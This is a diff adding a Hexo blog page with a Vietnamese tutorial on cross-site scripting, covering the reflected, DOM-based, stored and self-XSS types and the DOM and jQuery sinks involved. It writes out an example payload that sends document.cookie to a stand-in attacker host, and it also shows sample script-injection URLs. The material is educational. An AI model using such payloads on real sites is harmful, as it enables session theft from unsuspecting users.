@@ -1,0 +1,415 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>Cross Site Scripting (Part 1) | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Cross Site Scripting là gì ? Có những kiểu nào ?    Cross Site Scripting (XSS) là một trong những kiểu tấn công hay là lỗ hổng phổ biến hiện nay đổi với web application .Nó không gọi tắt là CSS để tr">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Cross Site Scripting (Part 1)">
+<meta property="og:url" content="http://yoursite.com/2020/06/14/Cross%20Site%20Scripting%20(Part1)/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Cross Site Scripting là gì ? Có những kiểu nào ?    Cross Site Scripting (XSS) là một trong những kiểu tấn công hay là lỗ hổng phổ biến hiện nay đổi với web application .Nó không gọi tắt là CSS để tr">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://dtsa.eu/wp-content/uploads/2017/06/wp_custom_fields_serach_poc-1024x375.png">
+<meta property="og:image" content="https://2.bp.blogspot.com/-Up9Gu_xOnLI/VSX6aqmSz0I/AAAAAAAAHWY/dIQi3ZY5JE4/s1600/3-17-2014-5-51-21-PM-700x398.jpg">
+<meta property="og:image" content="http://hydrasky.ml/wp-content/uploads/2020/03/image-1024x384.png">
+<meta property="og:image" content="https://i0.wp.com/securitydaily.net/wp-content/uploads/2014/03/stored-xss-scenario1.png?fit=998%252C576&amp;ssl=1">
+<meta property="og:image" content="http://hydrasky.ml/wp-content/uploads/2020/03/image-1.png">
+<meta property="article:published_time" content="2020-06-14T07:00:00.000Z">
+<meta property="article:modified_time" content="2020-06-15T16:21:58.764Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="Web App">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://dtsa.eu/wp-content/uploads/2017/06/wp_custom_fields_serach_poc-1024x375.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Cross Site Scripting (Part1)" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/06/14/Cross%20Site%20Scripting%20(Part1)/" class="article-date">
+  <time datetime="2020-06-14T07:00:00.000Z" itemprop="datePublished">2020-06-14</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Cross Site Scripting (Part 1)
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <!-- wp:heading {"level":4} -->
+<h4>Cross Site Scripting là gì ? Có những kiểu nào ?</h4>
+<!-- /wp:heading -->
+
+<!-- wp:paragraph -->
+<p>Cross Site Scripting (XSS) là một trong những kiểu tấn công hay là lỗ hổng phổ biến hiện nay đổi với web application .Nó không gọi tắt là CSS để tránh nhầm lẫn với khái niệm Cascading Style Sheet của HTML.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Kỹ thuật&nbsp;XSS&nbsp;được thực hiện dựa trên việc chèn các đoạn script độc hại vào trong source code ứng dụng web. Nhằm thực thi các đoạn mã độc Javascript để chiếm phiên làm việc (session) của người dùng. Từ đó cho phép kẻ tấn công giả danh thành người dùng , thực hiện bất kỳ chức năng nào mà người dùng có thể thực hiện và truy cập vào bất kỳ dữ liệu nào của người dùng mà không cần phải đăng nhập bằng tài khoản của nạn nhân. Nếu người dùng có quyền truy cập đặc quyền trong ứng dụng thì kẻ tấn công cũng có thể có toàn quyền kiểm soát tất cả các chức năng và dữ liệu của ứng dụng đó.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Một điều lưu ý bạn hiểu là tấn công XSS được thực hiện ở phía client không làm ảnh hưởng đến hệ thống trên server . Nó có thể được thực hiện với các ngôn ngữ lập trình phía client khác nhau. Tuy nhiên, thường xuyên nhất cuộc tấn công này được thực hiện với Javascript và HTML. </p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>XSS có 3 kiểu nhưng đều có cách thức tấn công chung là kẻ tấn công sẽ cố gắng gửi cho nạn nhân link có chứa script độc hại hoặc nội dung có chứa script độc hại nhằm lừa người dùng thực thi nó . Sau khi thực thi thì session của người dùng sẽ được gửi đến hacker . Hacker đã có quyền truy cập, thay đổi thông tin tài khoản mà nạn nhân không hề hay biết.  </p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Đây là một ví dụ kẻ tấn công chèn script qua giá trị đầu vào (input param) thông qua URL :</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://dtsa.eu/wp-content/uploads/2017/06/wp_custom_fields_serach_poc-1024x375.png" alt=""/><figcaption>Ví dụ XSS</figcaption></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Đây là cách thức đơn giản của việc kiểm thử lỗ hổng này, do mức độ bảo mật của các website ngày càng được nâng cao nên các biến thể của cách tấn công cũng đa dạng theo (Cụ thể như thế nào ở phần tiếp theo). Điều tiếp theo chúng ta  cần nhớ Cross Site Scripting (XSS) có 3 loại  chính là :</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:list -->
+<ul><li>Reflected XSS</li><li>Stored XSS</li><li>DOM based XSS (Biến thể của Reflected)</li></ul>
+<!-- /wp:list -->
+
+<!-- wp:heading {"level":4} -->
+<h4>Reflected XSS</h4>
+<!-- /wp:heading -->
+
+<!-- wp:paragraph -->
+<p>Trong 3 loại thì Reflected XSS là loại tấn công phổ biến nhất. Cách thức tấn công chủ yếu là gửi link có chứa script độc hại như sau:</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph {"customFontSize":15.5} -->
+<p style="font-size:15.5px">http://example.com/<a href="https://ac541f041e348399802625d4008000fe.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E" target="_blank" rel="noopener">name=&lt;script&gt;var i=new Image; i.src=”http://hacker-site.net/”+document.cookie;&lt;/script&gt;</a></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Khi người dùng click vào đường link , request sẽ được gửi lên server, sessionid được trả về phía client và script có trong thành phần (Element)  của website lúc này  và trình duyệt (Browser) sẽ thực thi script đó.Lúc này người dùng đang có phiên làm việc với ứng dụng (example.com), đoạn script sẽ gửi đến server của hacker (hacker-site.net) với giá trị  "document.cookie" - Sessionid. Dưới đây là hình ảnh minh họa các bước tấn công :</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://2.bp.blogspot.com/-Up9Gu_xOnLI/VSX6aqmSz0I/AAAAAAAAHWY/dIQi3ZY5JE4/s1600/3-17-2014-5-51-21-PM-700x398.jpg" alt=""/><figcaption>Các bước thực hiện tấn công Reflected XSS</figcaption></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p> Một bài lab trên portswigger.net về reflected XSS:</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":68,"sizeSlug":"large"} -->
+<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2020/03/image-1024x384.png" alt="" class="wp-image-68"/><figcaption>Reflected Xss Lab on Portswigger</figcaption></figure>
+<!-- /wp:image -->
+
+<!-- wp:quote -->
+<blockquote class="wp-block-quote"><p>Trong hình trên, ta chèn script độc hại thông qua biến "search" và đoạn script vẫn nằm trong cặp tag "h1".</p></blockquote>
+<!-- /wp:quote -->
+
+<!-- wp:heading {"level":4} -->
+<h4>DOM Based XSS</h4>
+<!-- /wp:heading -->
+
+<!-- wp:paragraph -->
+<p>Đầu tiên ta cần biết <a rel="noreferrer noopener" href="https://viblo.asia/p/nhung-khai-niem-co-ban-ve-dom-DzVkpoDgenW" target="_blank">DOM</a> là từ viết tắt của Document Object Model là 1 dạng chuẩn của W3C đưa ra nhằm để truy xuất và thao tác dữ liệu của tài liệu có cấu trúc như HTML, XML. Để javascript làm việc được với các thẻ HTML thì cần sử dụng đến DOM. Lấy một ví dụ như này: (W3school)</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:code -->
+<pre class="wp-block-code"><code>&lt;!DOCTYPE html>
+&lt;html>
+&lt;body>
+
+&lt;p>Click the button to display the URL of the document.&lt;/p>
+
+&lt;button onclick="myFunction()">Try it&lt;/button>
+
+&lt;p id="demo">&lt;/p>
+
+&lt;script>
+function myFunction() {
+  var x = document.URL;
+  document.getElementById("demo").innerHTML = x;
+}
+&lt;/script>
+
+&lt;/body>
+&lt;/html>
+</code></pre>
+<!-- /wp:code -->
+
+<!-- wp:paragraph -->
+<p>DOM Based XSS là kỹ thuật khai thác XSS &nbsp;dựa trên việc thao tác với dữ liệu của các DOM này, nó sử dụng dữ liệu của người dùng hay các dữ liệu ngoài như URL để thêm HTML vào trang như ví dụ trên. Về đặc điểm thì nó giống như reflected chỉ khác là payload sẽ không được sử lí bởi server mà nó sử lí bởi client , nó sẽ dựa vào DOM để có thể đưa payload vào làm giá trị của các element  trên  website. Như ví dụ trên ta sẽ sử dụng URL chứa payload nhưng vẫn được coi hợp lệ như sau "http://www.example.com/userdashboard.html#&lt;/p&gt;&lt;script&gt;SomeFunction(somevariable)&lt;/script&gt;" và kết quả sẽ là:</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:code -->
+<pre class="wp-block-code"><code>&lt;p>Click the button to display the URL of the document.&lt;/p>
+
+&lt;button onclick="myFunction()">Try it&lt;/button>
+
+&lt;p id="demo">http://www.example.com/userdashboard.html#&lt;/p>&lt;script>SomeFunction(somevariable)&lt;/script>&lt;/p>
+</code></pre>
+<!-- /wp:code -->
+
+<!-- wp:paragraph -->
+<p> Vì vậy lỗ hổng này sẽ khai thác khó hơn các kiểu còn lại vì nó yêu cầu kẻ tấn công có nhiều kiến thức về javascript và html.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Tấn công DOM Based XSS thông thường không qua các giá trị đầu vào mà nó qua "HTML Manipulation sinks" như: InnerHTML, outerHTML,  ...  và "Browser JavaScript execution sinks" như : eval sink, document sink , location sink ... .</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:quote -->
+<blockquote class="wp-block-quote"><p>document.write()<br> document.writeln()<br> document.domain<br> someDOMElement.innerHTML<br> someDOMElement.outerHTML<br> someDOMElement.insertAdjacentHTML<br> someDOMElement.onevent</p><cite>The following are some of the main sinks that can lead to DOM-XSS vulnerabilities:</cite></blockquote>
+<!-- /wp:quote -->
+
+<!-- wp:quote -->
+<blockquote class="wp-block-quote"><p>add()<br> after()<br> append()<br> animate()<br> insertAfter()<br> insertBefore()<br> before()<br> html()<br> prepend()<br> replaceAll()<br> replaceWith()<br> wrap()<br> wrapInner()<br> wrapAll()<br> has()<br> constructor()<br> init()<br> index()<br> jQuery.parseHTML()<br> $.parseHTML()</p><cite>The following jQuery functions are also sinks that can lead to DOM-XSS vulnerabilities:</cite></blockquote>
+<!-- /wp:quote -->
+
+<!-- wp:paragraph -->
+<p> Vì chuỗi độc hại được chèn vào trang bằng cách sử dụng innerHTML, nên nó được phân tích cú pháp dưới dạng HTML, khiến tập lệnh độc hại được thực thi.Hầu hết nguyên nhân dẫn đến lỗ hổng do người lập trình đã không kiểm soát đầu vào lỏng lẻo khi dùng các đối tượng trên  và nó cũng có thể tồn tại trong các thư viện như Jquery hay các framework: &nbsp;angular,&nbsp;react, ....  có sẵn mà người phát triển không hay biết. </p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Một lưu ý khi kiểm tra lỗ hổng DOM Base XSS thì không nên dùng " View page source" (Ctrl +U) để xem luồng xử lí javascript hoạt động bởi vì nó sẽ không thấy được sự thay đổi .Thay vào đó hãy sử dụng "Developer tool" (Ctrl+Shift+I) và search (Ctrl + F) để tìm kiểm. </p>
+<!-- /wp:paragraph -->
+
+<!-- wp:heading {"level":4} -->
+<h4>STORED XSS</h4>
+<!-- /wp:heading -->
+
+<!-- wp:paragraph -->
+<p>Khác với 2 loại tấn công trên, Stored XSS hướng đến nhiều nạn nhân hơn. Lỗi này xảy vẫn xảy ra khi ứng dụng web không kiểm tra kỹ các dữ liệu đầu vào nhưng giá trị lần này sẽ được lưu vào cơ sở dữ liệu (database , file hay những khu vực khác nhằm lưu trữ dữ liệu của ứng dụng web). Ví dụ như các form góp ý, các comment … trên các trang web. Với kỹ thuật Stored XSS , hacker không khai thác trực tiếp mà phải thực hiện tối thiểu qua 2 bước.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Đầu tiên hacker sẽ thông qua các điểm đầu vào (form, input, textarea…) không được kiểm tra kỹ để chèn vào CSDL các đoạn mã nguy hiểm.Tiếp theo đó người dùng truy cập vào dữ liệu có chứa script độc hại của hacker dẫn đến script được thực thi. Mức độ phát hiện bị lừa khó hơn 2 kiểu trước .</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://i0.wp.com/securitydaily.net/wp-content/uploads/2014/03/stored-xss-scenario1.png?fit=998%2C576&amp;ssl=1" alt=""/><figcaption>Stored XSS</figcaption></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Ngoài 3 kiểu trên còn tồn tại một kiểu XSS được gọi là <strong>SELF-XSS</strong>.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p> Self-XSS không thể khai thác trực tiếp hay được lưu trữ lại như trong 3 cách trên mà nó yêu cầu phải kết hợp cả kĩ nghệ xã hội (Soical Engineering) - hay hiểu đơn giản là lừa chính nạn nhân thiếu hiểu biết (VD: Lừa  sẽ được thanh toàn miễn phí khi làm theo) chèn script và thực thi ở những vị trí tồn tại  XSS. Tester thường nghĩ là lỗ hổng XSS có thể tồn tại nhưng không thể khai thác được nhưng trong một số Bug Bounty Program vẫn được tính và trao thưởng.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":71,"sizeSlug":"large"} -->
+<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2020/03/image-1.png" alt="" class="wp-image-71"/><figcaption><a href="https://hackerone.com/reports/755679" target="_blank" rel="noopener">https://hackerone.com/reports/755679</a></figcaption></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Phần tiếp theo XXX sẽ giới thiệu các cách khai thác lỗ hổng này. </p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Link tham khảo :</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:list -->
+<ul><li><a href="https://tech.bizflycloud.vn/tong-quan-ve-dom-based-cross-site-scripting-dom-xss-20190424103508199.htm" target="_blank" rel="noopener">https://tech.bizflycloud.vn/tong-quan-ve-dom-based-cross-site-scripting-dom-xss-20190424103508199.htm</a></li><li><a href="https://portswigger.net/web-security/cross-site-scripting" target="_blank" rel="noopener">https://portswigger.net/web-security/cross-site-scripting</a></li><li></li></ul>
+<!-- /wp:list -->
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/06/14/Cross%20Site%20Scripting%20(Part1)/" data-id="ckbgpmbch0007qxjm5adsg6om" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web-App/" rel="tag">Web App</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2020/06/14/Session%20vs%20Token-Based%20Authentication/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          Session &amp; Token-Based Authentication
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/06/14/Host%20Header%20Attack/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Host Header Attack</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/BugBoutyTip/" rel="tag">BugBoutyTip</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Technology/" rel="tag">Technology</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web-App/" rel="tag">Web App</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web-Server/" rel="tag">Web Server</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/BugBoutyTip/" style="font-size: 10px;">BugBoutyTip</a> <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/Technology/" style="font-size: 20px;">Technology</a> <a href="/tags/Web-App/" style="font-size: 13.33px;">Web App</a> <a href="/tags/Web-Server/" style="font-size: 16.67px;">Web Server</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/06/15/CROSS%20SIDE%20REQUEST%20FORGERY/">Cross Side Request Forgery</a>
+          </li>
+        
+          <li>
+            <a href="/2020/06/14/oath/">Oauth</a>
+          </li>
+        
+          <li>
+            <a href="/2020/06/14/Session%20vs%20Token-Based%20Authentication/">Session &amp; Token-Based Authentication</a>
+          </li>
+        
+          <li>
+            <a href="/2020/06/14/Cross%20Site%20Scripting%20(Part1)/">Cross Site Scripting (Part 1)</a>
+          </li>
+        
+          <li>
+            <a href="/2020/06/14/Host%20Header%20Attack/">Host Header Attack</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
